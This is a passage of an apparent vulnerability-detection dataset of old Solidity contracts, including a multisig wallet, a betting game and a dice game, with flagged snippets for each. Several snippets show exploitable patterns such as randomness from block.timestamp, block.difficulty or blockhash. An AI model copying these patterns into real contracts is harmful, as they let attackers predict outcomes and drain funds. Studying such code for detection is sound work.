clearPending();\n if (m_numOwners >= c_maxOwners)\n reorganizeOwners();\n if (m_numOwners >= c_maxOwners)\n return;\n m_numOwners++;\n m_owners[m_numOwners] = uint(_owner);\n m_ownerIndex[uint(_owner)] = m_numOwners;\n emit OwnerAdded(_owner);\n }\n function removeOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n uint ownerIndex = m_ownerIndex[uint(_owner)];\n if (ownerIndex == 0) return;\n if (m_required > m_numOwners - 1) return;\n m_owners[ownerIndex] = 0;\n m_ownerIndex[uint(_owner)] = 0;\n clearPending();\n reorganizeOwners();\n emit OwnerRemoved(_owner);\n }\n function changeRequirement(uint _newRequired) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n if (_newRequired > m_numOwners) return;\n m_required = _newRequired;\n clearPending();\n emit RequirementChanged(_newRequired);\n }\n function isOwner(address _addr) public view returns (bool) {\n return m_ownerIndex[uint(_addr)] > 0;\n }\n function hasConfirmed(bytes32 _operation, address _owner) public view returns (bool) {\n PendingState storage pending = m_pending[_operation];\n uint ownerIndex = m_ownerIndex[uint(_owner)];\n if (ownerIndex == 0) return false;\n uint ownerIndexBit = 2**ownerIndex;\n if (pending.ownersDone & ownerIndexBit == 0) {\n return false;\n } else {\n return true;\n }\n }\n function confirmAndCheck(bytes32 _operation) internal returns (bool) {\n uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n if (ownerIndex == 0) return;\n PendingState storage pending = m_pending[_operation];\n if (pending.yetNeeded == 0) {\n pending.yetNeeded = m_required;\n pending.ownersDone = 0;\n pending.index = m_pendingIndex.length++;\n m_pendingIndex[pending.index] = _operation;\n }\n uint ownerIndexBit = 2**ownerIndex;\n if (pending.ownersDone & ownerIndexBit == 0) {\n emit Confirmation(msg.sender, _operation);\n if (pending.yetNeeded <= 1) {\n delete m_pendingIndex[m_pending[_operation].index];\n delete m_pending[_operation];\n return true;\n }\n else\n {\n pending.yetNeeded--;\n pending.ownersDone |= ownerIndexBit;\n }\n }\n }\n function reorganizeOwners() private returns (bool) {\n uint free = 1;\n while (free < m_numOwners)\n {\n while (free < m_numOwners && m_owners[free] != 0) free++;\n while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;\n if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)\n {\n m_owners[free] = m_owners[m_numOwners];\n m_ownerIndex[m_owners[free]] = free;\n m_owners[m_numOwners] = 0;\n }\n }\n }\n function clearPending() internal {\n uint length = m_pendingIndex.length;\n for (uint i = 0; i < length; ++i) {\n if (m_pendingIndex[i] != 0) {\n delete m_pending[m_pendingIndex[i]];\n }\n }\n delete m_pendingIndex;\n }\n uint public m_required;\n uint public m_numOwners;\n uint[256] m_owners;\n uint constant c_maxOwners = 250;\n mapping(uint => uint) m_ownerIndex;\n mapping(bytes32 => PendingState) m_pending;\n bytes32[] m_pendingIndex;\n}\ncontract daylimit is multiowned {\n modifier limitedDaily(uint _value) {\n if (underLimit(_value))\n _;\n }\n constructor(uint _limit) public {\n m_dailyLimit = _limit;\n m_lastDay = today();\n }\n function setDailyLimit(uint _newLimit) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n m_dailyLimit = _newLimit;\n }\n function resetSpentToday() onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n m_spentToday = 0;\n }\n function underLimit(uint _value) internal onlyowner returns (bool) {\n if (today() > m_lastDay) {\n m_spentToday = 0;\n m_lastDay = today();\n }\n if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {\n m_spentToday += _value;\n return true;\n }\n return false;\n }\n function today() private view returns (uint) { return block.timestamp / 1 days; }\n uint public m_dailyLimit;\n uint public m_spentToday;\n uint public m_lastDay;\n}\ncontract multisig {\n event Deposit(address from, uint value);\n event SingleTransact(address owner, uint value, address to);\n event MultiTransact(address owner, bytes32 operation, uint value, address to);\n event ConfirmationERC20Needed(bytes32 operation, address initiator, uint value, address to, ERC20Basic token);\n event ConfirmationETHNeeded(bytes32 operation, address initiator, uint value, address to);\n function changeOwner(address _from, address _to) external;\n}\ncontract Wallet is multisig, multiowned, daylimit {\n uint public version = 3;\n struct Transaction {\n address to;\n uint value;\n address token;\n }\n constructor(address[] _owners, uint _required, uint _daylimit)\n multiowned(_owners, _required) daylimit(_daylimit) public {\n }\n function kill(address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data))) external {\n selfdestruct(_to);\n }\n function() public payable {\n if (msg.value > 0)\n emit Deposit(msg.sender, msg.value);\n }\n function transferETH(address _to, uint _value) external onlyowner returns (bytes32 _r) {\n if (underLimit(_value)) {\n emit SingleTransact(msg.sender, _value, _to);\n _to.transfer(_value);\n return 0;\n }\n _r = keccak256(abi.encodePacked(msg.data, block.number));\n if (!confirmETH(_r) && m_txs[_r].to == 0) {\n m_txs[_r].to = _to;\n m_txs[_r].value = _value;\n emit ConfirmationETHNeeded(_r, msg.sender, _value, _to);\n }\n }\n function confirmETH(bytes32 _h) onlymanyowners(_h) public returns (bool) {\n if (m_txs[_h].to != 0) {\n m_txs[_h].to.transfer(m_txs[_h].value);\n emit MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to);\n delete m_txs[_h];\n return true;\n }\n }\n function transferERC20(address _to, uint _value, address _token) external onlyowner returns (bytes32 _r) {\n if (underLimit(_value)) {\n emit SingleTransact(msg.sender, _value, _to);\n ERC20Basic token = ERC20Basic(_token);\n token.transfer(_to, _value);\n return 0;\n }\n _r = keccak256(abi.encodePacked(msg.data, block.number));\n if (!confirmERC20(_r) && m_txs[_r].to == 0) {\n m_txs[_r].to = _to;\n m_txs[_r].value = _value;\n m_txs[_r].token = _token;\n emit ConfirmationERC20Needed(_r, msg.sender, _value, _to, token);\n }\n }\n function confirmERC20(bytes32 _h) onlymanyowners(_h) public returns (bool) {\n if (m_txs[_h].to != 0) {\n ERC20Basic token = ERC20Basic(m_txs[_h].token);\n token.transfer(m_txs[_h].to, m_txs[_h].value);\n emit MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to);\n delete m_txs[_h];\n return true;\n }\n }\n function clearPending() internal {\n uint length = m_pendingIndex.length;\n for (uint i = 0; i < length; ++i)\n delete m_txs[m_pendingIndex[i]];\n super.clearPending();\n }\n mapping (bytes32 => Transaction) m_txs;\n}",
  "extract_feature": [
    "function today() private view returns (uint) { return block.timestamp / 1 days; }\nuint public m_dailyLimit;\nuint public m_spentToday;\nuint public m_lastDay;\n}",
    "function transferETH(address _to, uint _value) external onlyowner returns (bytes32 _r) {\nif (underLimit(_value)) {\nemit SingleTransact(msg.sender, _value, _to);\n_to.transfer(_value);\nreturn 0;\n}\n_r = keccak256(abi.encodePacked(msg.data, block.number));\nif (!confirmETH(_r) && m_txs[_r].to == 0) {\nm_txs[_r].to = _to;\nm_txs[_r].value = _value;\nemit ConfirmationETHNeeded(_r, msg.sender, _value, _to);\n}\n}",
    "function transferERC20(address _to, uint _value, address _token) external onlyowner returns (bytes32 _r) {\nif (underLimit(_value)) {\nemit SingleTransact(msg.sender, _value, _to);\nERC20Basic token = ERC20Basic(_token);\ntoken.transfer(_to, _value);\nreturn 0;\n}\n_r = keccak256(abi.encodePacked(msg.data, block.number));\nif (!confirmERC20(_r) && m_txs[_r].to == 0) {\nm_txs[_r].to = _to;\nm_txs[_r].value = _value;\nm_txs[_r].token = _token;\nemit ConfirmationERC20Needed(_r, msg.sender, _value, _to, token);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b4d"
  },
  "filename": "2529.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Ownable {\n address public owner;\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract DefconPro is Ownable {\n event Defcon(uint64 blockNumber, uint16 defconLevel);\n uint16 public defcon = 5;\n modifier defcon4() {\n require(defcon > 4);\n _;\n }\n modifier defcon3() {\n require(defcon > 3);\n _;\n }\n modifier defcon2() {\n require(defcon > 2);\n _;\n }\n modifier defcon1() {\n require(defcon > 1);\n _;\n }\n function setDefconLevel(uint16 _defcon) onlyOwner public {\n defcon = _defcon;\n Defcon(uint64(block.number), _defcon);\n }\n}\ncontract bigBankLittleBank is DefconPro {\n using SafeMath for uint;\n uint public houseFee = 2;\n uint public houseCommission = 0;\n uint public bookKeeper = 0;\n bytes32 emptyBet = 0x0000000000000000000000000000000000000000000000000000000000000000;\n event BigBankBet(uint blockNumber, address indexed winner, address indexed loser, uint winningBetId1, uint losingBetId2, uint total);\n event Deposit(address indexed user, uint amount);\n event Withdraw(address indexed user, uint amount);\n BetBank[] private betBanks;\n struct BetBank {\n bytes32 bet;\n address owner;\n }\n function userBalance() public view returns(uint) {\n return userBank[msg.sender];\n }\n mapping (address => uint) public userBank;\n function depositBank() public defcon4 payable {\n if(userBank[msg.sender] == 0) {\n userBank[msg.sender] = msg.value;\n } else {\n userBank[msg.sender] = (userBank[msg.sender]).add(msg.value);\n }\n bookKeeper = bookKeeper.add(msg.value);\n Deposit(msg.sender, msg.value);\n }\n function withdrawBank(uint amount) public defcon2 returns(bool) {\n require(userBank[msg.sender] >= amount);\n bookKeeper = bookKeeper.sub(amount);\n userBank[msg.sender] = userBank[msg.sender].sub(amount);\n Withdraw(msg.sender, amount);\n (msg.sender).transfer(amount);\n return true;\n }\n function startBet(uint _bet) public defcon3 returns(uint betId) {\n require(userBank[msg.sender] >= _bet);\n require(_bet > 0);\n userBank[msg.sender] = (userBank[msg.sender]).sub(_bet);\n uint convertedAddr = uint(msg.sender);\n uint combinedBet = convertedAddr.add(_bet)*7;\n BetBank memory betBank = BetBank({\n bet: bytes32(combinedBet),\n owner: msg.sender\n });\n betId = betBanks.push(betBank).sub(1);\n }\n function _endBetListing(uint betId) private returns(bool){\n delete betBanks[betId];\n }\n function betAgainstUser(uint _betId1, uint _betId2) public defcon3 returns(bool){\n require(betBanks[_betId1].bet != emptyBet && betBanks[_betId2].bet != emptyBet);\n require(betBanks[_betId1].owner == msg.sender || betBanks[_betId2].owner == msg.sender);\n require(betBanks[_betId1].owner != betBanks[_betId2].owner);\n require(_betId1 != _betId2);\n uint bet1ConvertedAddr = uint(betBanks[_betId1].owner);\n uint bet1 = (uint(betBanks[_betId1].bet)/7).sub(bet1ConvertedAddr);\n uint bet2ConvertedAddr = uint(betBanks[_betId2].owner);\n uint bet2 = (uint(betBanks[_betId2].bet)/7).sub(bet2ConvertedAddr);\n uint take = (bet1).add(bet2);\n uint fee = (take.mul(houseFee)).div(100);\n houseCommission = houseCommission.add(fee);\n if(bet1 != bet2) {\n if(bet1 > bet2) {\n _payoutWinner(_betId1, _betId2, take, fee);\n } else {\n _payoutWinner(_betId2, _betId1, take, fee);\n }\n } else {\n if(_random() == 0) {\n _payoutWinner(_betId1, _betId2, take, fee);\n } else {\n _payoutWinner(_betId2, _betId1, take, fee);\n }\n }\n return true;\n }\n function _payoutWinner(uint winner, uint loser, uint take, uint fee) private returns(bool) {\n BigBankBet(block.number, betBanks[winner].owner, betBanks[loser].owner, winner, loser, take.sub(fee));\n address winnerAddr = betBanks[winner].owner;\n _endBetListing(winner);\n _endBetListing(loser);\n userBank[winnerAddr] = (userBank[winnerAddr]).add(take.sub(fee));\n return true;\n }\n function setHouseFee(uint newFee)public onlyOwner returns(bool) {\n require(msg.sender == owner);\n houseFee = newFee;\n return true;\n }\n function withdrawCommission()public onlyOwner returns(bool) {\n require(msg.sender == owner);\n bookKeeper = bookKeeper.sub(houseCommission);\n uint holding = houseCommission;\n houseCommission = 0;\n owner.transfer(holding);\n return true;\n }\n function _random() private view returns (uint8) {\n return uint8(uint256(keccak256(block.timestamp, block.difficulty))%2);\n }\n function _totalActiveBets() private view returns(uint total) {\n total = 0;\n for(uint i=0; i<betBanks.length; i++) {\n if(betBanks[i].bet != emptyBet && betBanks[i].owner != msg.sender) {\n total++;\n }\n }\n }\n function listActiveBets() public view returns(uint[]) {\n uint256 total = _totalActiveBets();\n if (total == 0) {\n return new uint256[](0);\n } else {\n uint256[] memory result = new uint256[](total);\n uint rc = 0;\n for (uint idx=0; idx < betBanks.length; idx++) {\n if(betBanks[idx].bet != emptyBet && betBanks[idx].owner != msg.sender) {\n result[rc] = idx;\n rc++;\n }\n }\n }\n return result;\n }\n function _totalUsersBets() private view returns(uint total) {\n total = 0;\n for(uint i=0; i<betBanks.length; i++) {\n if(betBanks[i].owner == msg.sender && betBanks[i].bet != emptyBet) {\n total++;\n }\n }\n }\n function listUsersBets() public view returns(uint[]) {\n uint256 total = _totalUsersBets();\n if (total == 0) {\n return new uint256[](0);\n } else {\n uint256[] memory result = new uint256[](total);\n uint rc = 0;\n for (uint idx=0; idx < betBanks.length; idx++) {\n if(betBanks[idx].owner == msg.sender && betBanks[idx].bet != emptyBet) {\n result[rc] = idx;\n rc++;\n }\n }\n }\n return result;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function setDefconLevel(uint16 _defcon) onlyOwner public {\ndefcon = _defcon;\nDefcon(uint64(block.number), _defcon);\n}",
    "function _payoutWinner(uint winner, uint loser, uint take, uint fee) private returns(bool) {\nBigBankBet(block.number, betBanks[winner].owner, betBanks[loser].owner, winner, loser, take.sub(fee));\naddress winnerAddr = betBanks[winner].owner;\n_endBetListing(winner);\n_endBetListing(loser);\nuserBank[winnerAddr] = (userBank[winnerAddr]).add(take.sub(fee));\nreturn true;\n}",
    "function _random() private view returns (uint8) {\nreturn uint8(uint256(keccak256(block.timestamp, block.difficulty))%2);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b4e"
  },
  "filename": "2553.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract multiowned {\n struct PendingState {\n uint yetNeeded;\n uint ownersDone;\n uint index;\n }\n event Confirmation(address owner, bytes32 operation);\n event Revoke(address owner, bytes32 operation);\n event OwnerChanged(address oldOwner, address newOwner);\n event OwnerAdded(address newOwner);\n event OwnerRemoved(address oldOwner);\n event RequirementChanged(uint newRequirement);\n modifier onlyowner {\n if (isOwner(msg.sender))\n _;\n }\n modifier onlymanyowners(bytes32 _operation) {\n if (confirmAndCheck(_operation))\n _;\n }\n constructor(address[] _owners, uint _required) public {\n m_numOwners = _owners.length + 1;\n m_owners[1] = uint(msg.sender);\n m_ownerIndex[uint(msg.sender)] = 1;\n for (uint i = 0; i < _owners.length; ++i)\n {\n m_owners[2 + i] = uint(_owners[i]);\n m_ownerIndex[uint(_owners[i])] = 2 + i;\n }\n m_required = _required;\n }\n function revoke(bytes32 _operation) external {\n uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n if (ownerIndex == 0) return;\n uint ownerIndexBit = 2**ownerIndex;\n PendingState storage pending = m_pending[_operation];\n if (pending.ownersDone & ownerIndexBit > 0) {\n pending.yetNeeded++;\n pending.ownersDone -= ownerIndexBit;\n emit Revoke(msg.sender, _operation);\n }\n }\n function changeOwner(address _from, address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\n if (isOwner(_to)) return;\n uint ownerIndex = m_ownerIndex[uint(_from)];\n if (ownerIndex == 0) return;\n clearPending();\n m_owners[ownerIndex] = uint(_to);\n m_ownerIndex[uint(_from)] = 0;\n m_ownerIndex[uint(_to)] = ownerIndex;\n emit OwnerChanged(_from, _to);\n }\n function addOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\n if (isOwner(_owner)) return;\n clearPending();\n if (m_numOwners >= c_maxOwners)\n reorganizeOwners();\n if (m_numOwners >= c_maxOwners)\n return;\n m_numOwners++;\n m_owners[m_numOwners] = uint(_owner);\n m_ownerIndex[uint(_owner)] = m_numOwners;\n emit OwnerAdded(_owner);\n }\n function removeOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\n uint ownerIndex = m_ownerIndex[uint(_owner)];\n if (ownerIndex == 0) return;\n if (m_required > m_numOwners - 1) return;\n m_owners[ownerIndex] = 0;\n m_ownerIndex[uint(_owner)] = 0;\n clearPending();\n reorganizeOwners();\n emit OwnerRemoved(_owner);\n }\n function changeRequirement(uint _newRequired) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\n if (_newRequired > m_numOwners) return;\n m_required = _newRequired;\n clearPending();\n emit RequirementChanged(_newRequired);\n }\n function isOwner(address _addr) public view returns (bool) {\n return m_ownerIndex[uint(_addr)] > 0;\n }\n function hasConfirmed(bytes32 _operation, address _owner) public view returns (bool) {\n PendingState storage pending = m_pending[_operation];\n uint ownerIndex = m_ownerIndex[uint(_owner)];\n if (ownerIndex == 0) return false;\n uint ownerIndexBit = 2**ownerIndex;\n if (pending.ownersDone & ownerIndexBit == 0) {\n return false;\n } else {\n return true;\n }\n }\n function confirmAndCheck(bytes32 _operation) internal returns (bool) {\n uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n if (ownerIndex == 0) return;\n PendingState storage pending = m_pending[_operation];\n if (pending.yetNeeded == 0) {\n pending.yetNeeded = m_required;\n pending.ownersDone = 0;\n pending.index = m_pendingIndex.length++;\n m_pendingIndex[pending.index] = _operation;\n }\n uint ownerIndexBit = 2**ownerIndex;\n if (pending.ownersDone & ownerIndexBit == 0) {\n emit Confirmation(msg.sender, _operation);\n if (pending.yetNeeded <= 1) {\n delete m_pendingIndex[m_pending[_operation].index];\n delete m_pending[_operation];\n return true;\n }\n else\n {\n pending.yetNeeded--;\n pending.ownersDone |= ownerIndexBit;\n }\n }\n }\n function reorganizeOwners() private returns (bool) {\n uint free = 1;\n while (free < m_numOwners)\n {\n while (free < m_numOwners && m_owners[free] != 0) free++;\n while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;\n if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)\n {\n m_owners[free] = m_owners[m_numOwners];\n m_ownerIndex[m_owners[free]] = free;\n m_owners[m_numOwners] = 0;\n }\n }\n }\n function clearPending() internal {\n uint length = m_pendingIndex.length;\n for (uint i = 0; i < length; ++i) {\n if (m_pendingIndex[i] != 0) {\n delete m_pending[m_pendingIndex[i]];\n }\n }\n delete m_pendingIndex;\n }\n uint public m_required;\n uint public m_numOwners;\n uint[256] m_owners;\n uint constant c_maxOwners = 250;\n mapping(uint => uint) m_ownerIndex;\n mapping(bytes32 => PendingState) m_pending;\n bytes32[] m_pendingIndex;\n}\ncontract daylimit is multiowned {\n modifier limitedDaily(uint _value) {\n if (underLimit(_value))\n _;\n }\n constructor(uint _limit) public {\n m_dailyLimit = _limit;\n m_lastDay = today();\n }\n function setDailyLimit(uint _newLimit) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\n m_dailyLimit = _newLimit;\n }\n function resetSpentToday() onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\n m_spentToday = 0;\n }\n function underLimit(uint _value) internal onlyowner returns (bool) {\n if (today() > m_lastDay) {\n m_spentToday = 0;\n m_lastDay = today();\n }\n if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {\n m_spentToday += _value;\n return true;\n }\n return false;\n }\n function today() private view returns (uint) { return block.timestamp / 1 days; }\n uint public m_dailyLimit;\n uint public m_spentToday;\n uint public m_lastDay;\n}\ncontract multisig {\n event Deposit(address from, uint value);\n event SingleTransact(address owner, uint value, address to);\n event MultiTransact(address owner, bytes32 operation, uint value, address to);\n event ConfirmationERC20Needed(bytes32 operation, address initiator, uint value, address to, ERC20Basic token);\n event ConfirmationETHNeeded(bytes32 operation, address initiator, uint value, address to);\n function changeOwner(address _from, address _to) external;\n}\ncontract Wallet is multisig, multiowned, daylimit {\n uint public version = 3;\n struct Transaction {\n address to;\n uint value;\n address token;\n }\n constructor(address[] _owners, uint _required, uint _daylimit)\n multiowned(_owners, _required) daylimit(_daylimit) public {\n }\n function kill(address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\n selfdestruct(_to);\n }\n function() public payable {\n if (msg.value > 0)\n emit Deposit(msg.sender, msg.value);\n }\n function transferETH(address _to, uint _value) external onlyowner returns (bytes32 _r) {\n if (underLimit(_value)) {\n emit SingleTransact(msg.sender, _value, _to);\n _to.transfer(_value);\n return 0;\n }\n _r = keccak256(abi.encodePacked(msg.data, block.number));\n if (!confirmETH(_r) && m_txs[_r].to == 0) {\n m_txs[_r].to = _to;\n m_txs[_r].value = _value;\n emit ConfirmationETHNeeded(_r, msg.sender, _value, _to);\n }\n }\n function confirmETH(bytes32 _h) onlymanyowners(_h) public returns (bool) {\n if (m_txs[_h].to != 0) {\n m_txs[_h].to.transfer(m_txs[_h].value);\n emit MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to);\n delete m_txs[_h];\n return true;\n }\n }\n function transferERC20(address _to, uint _value, address _token) external onlyowner returns (bytes32 _r) {\n if (underLimit(_value)) {\n emit SingleTransact(msg.sender, _value, _to);\n ERC20Basic token = ERC20Basic(_token);\n token.transfer(_to, _value);\n return 0;\n }\n _r = keccak256(abi.encodePacked(msg.data, block.number));\n if (!confirmERC20(_r) && m_txs[_r].to == 0) {\n m_txs[_r].to = _to;\n m_txs[_r].value = _value;\n m_txs[_r].token = _token;\n emit ConfirmationERC20Needed(_r, msg.sender, _value, _to, token);\n }\n }\n function confirmERC20(bytes32 _h) onlymanyowners(_h) public returns (bool) {\n if (m_txs[_h].to != 0) {\n ERC20Basic token = ERC20Basic(m_txs[_h].token);\n token.transfer(m_txs[_h].to, m_txs[_h].value);\n emit MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to);\n delete m_txs[_h];\n return true;\n }\n }\n function clearPending() internal {\n uint length = m_pendingIndex.length;\n for (uint i = 0; i < length; ++i)\n delete m_txs[m_pendingIndex[i]];\n super.clearPending();\n }\n mapping (bytes32 => Transaction) m_txs;\n}",
  "extract_feature": [
    "function changeOwner(address _from, address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\nif (isOwner(_to)) return;\nuint ownerIndex = m_ownerIndex[uint(_from)];\nif (ownerIndex == 0) return;\nclearPending();\nm_owners[ownerIndex] = uint(_to);\nm_ownerIndex[uint(_from)] = 0;\nm_ownerIndex[uint(_to)] = ownerIndex;\nemit OwnerChanged(_from, _to);\n}",
    "function addOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\nif (isOwner(_owner)) return;\nclearPending();\nif (m_numOwners >= c_maxOwners)\nreorganizeOwners();\nif (m_numOwners >= c_maxOwners)\nreturn;\nm_numOwners++;\nm_owners[m_numOwners] = uint(_owner);\nm_ownerIndex[uint(_owner)] = m_numOwners;\nemit OwnerAdded(_owner);\n}",
    "function removeOwner(address _owner) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\nuint ownerIndex = m_ownerIndex[uint(_owner)];\nif (ownerIndex == 0) return;\nif (m_required > m_numOwners - 1) return;\nm_owners[ownerIndex] = 0;\nm_ownerIndex[uint(_owner)] = 0;\nclearPending();\nreorganizeOwners();\nemit OwnerRemoved(_owner);\n}",
    "function changeRequirement(uint _newRequired) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\nif (_newRequired > m_numOwners) return;\nm_required = _newRequired;\nclearPending();\nemit RequirementChanged(_newRequired);\n}",
    "function setDailyLimit(uint _newLimit) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\nm_dailyLimit = _newLimit;\n}",
    "function resetSpentToday() onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\nm_spentToday = 0;\n}",
    "function today() private view returns (uint) { return block.timestamp / 1 days; }\nuint public m_dailyLimit;\nuint public m_spentToday;\nuint public m_lastDay;\n}",
    "function kill(address _to) onlymanyowners(keccak256(abi.encodePacked(msg.data, block.number))) external {\nselfdestruct(_to);\n}",
    "function transferETH(address _to, uint _value) external onlyowner returns (bytes32 _r) {\nif (underLimit(_value)) {\nemit SingleTransact(msg.sender, _value, _to);\n_to.transfer(_value);\nreturn 0;\n}\n_r = keccak256(abi.encodePacked(msg.data, block.number));\nif (!confirmETH(_r) && m_txs[_r].to == 0) {\nm_txs[_r].to = _to;\nm_txs[_r].value = _value;\nemit ConfirmationETHNeeded(_r, msg.sender, _value, _to);\n}\n}",
    "function transferERC20(address _to, uint _value, address _token) external onlyowner returns (bytes32 _r) {\nif (underLimit(_value)) {\nemit SingleTransact(msg.sender, _value, _to);\nERC20Basic token = ERC20Basic(_token);\ntoken.transfer(_to, _value);\nreturn 0;\n}\n_r = keccak256(abi.encodePacked(msg.data, block.number));\nif (!confirmERC20(_r) && m_txs[_r].to == 0) {\nm_txs[_r].to = _to;\nm_txs[_r].value = _value;\nm_txs[_r].token = _token;\nemit ConfirmationERC20Needed(_r, msg.sender, _value, _to, token);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b4f"
  },
  "filename": "2584.sol",
  "content": "pragma solidity ^0.4.23;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function getFrontEndTokenBalanceOf(address who) public view returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zethroll is ZTHReceivingContract {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n require( calculateProfit(_betSize, _playerNumber) < maxProfit\n && _betSize >= minBet\n && _playerNumber > minNumber\n && _playerNumber < maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 99;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n address public ZethrBankroll;\n address public ZTHTKNADDR;\n ZTHInterface public ZTHTKN;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n uint public totalBets;\n uint public totalZTHWagered;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n constructor (address zthtknaddr, address zthbankrolladdr) public {\n owner = msg.sender;\n ZTHTKN = ZTHInterface(zthtknaddr);\n ZTHTKNADDR = zthtknaddr;\n ZethrBankroll = zthbankrolladdr;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n ZTHTKN.approve(zthbankrolladdr, MAX_INT);\n }\n function() public payable {}\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (100 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n struct playerRoll{\n uint200 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder)\n {\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(_zthToken(msg.sender));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(false, _tkn.sender);\n }\n roll.blockn = uint48(block.number);\n roll.tokenValue = uint200(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n totalBets += 1;\n totalZTHWagered += _tkn.value;\n }\n function finishBet() public\n gameIsActive\n returns (uint)\n {\n return _finishBet(true, msg.sender);\n }\n function _finishBet(bool delete_it, address target) private returns (uint){\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n require(roll.blockn != block.number);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(99, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n if (profit > maxProfit){\n profit = maxProfit;\n }\n contractBalance = contractBalance.sub(profit);\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit();\n delete playerRolls[target];\n ZTHTKN.transfer(target, profit + roll.tokenValue);\n return result;\n } else 